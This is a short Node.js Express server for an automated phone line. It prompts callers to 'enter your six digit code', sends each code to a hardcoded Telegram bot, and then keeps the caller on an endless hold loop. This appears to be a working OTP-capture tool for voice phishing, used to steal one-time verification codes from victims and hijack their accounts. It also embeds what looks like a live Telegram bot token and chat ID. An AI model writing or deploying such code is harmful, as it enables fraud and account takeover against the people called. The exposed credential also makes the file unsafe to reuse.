const express = require("express")
const bodyParser = require("body-parser")
const fetch = require("node-fetch")

const app = express()
app.use(bodyParser.urlencoded({ extended: false }))

const TELEGRAM_TOKEN="8228599449:AAGUy-92UzJw9M7XWsVoKh_WqdRkaXOd89o"
const CHAT_ID="8054287304"

let activeCall=null
let lastCode=null

async function sendTelegram(text){
await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id:CHAT_ID,
text:text
})
})
}

app.get("/",(req,res)=>{
res.send("IVR server running")
})

app.all("/ivr",(req,res)=>{

activeCall=req.body.CallSid

res.type("text/xml")

res.send(`
<Response>
<Gather numDigits="6" action="/code" method="POST">
<Say>Please enter your six digit code</Say>
</Gather>
</Response>
`)
})

app.all("/code",(req,res)=>{

const digits=req.body.Digits
lastCode=digits

sendTelegram(`📞 New Code Received\n\nCode: ${digits}`)

res.type("text/xml")

res.send(`
<Response>
<Say>Please hold while we verify.</Say>
<Redirect>/hold</Redirect>
</Response>
`)
})

app.all("/hold",(req,res)=>{

res.type("text/xml")

res.send(`
<Response>
<Pause length="20"/>
<Redirect>/hold</Redirect>
</Response>
`)
})

app.listen(process.env.PORT||3000)
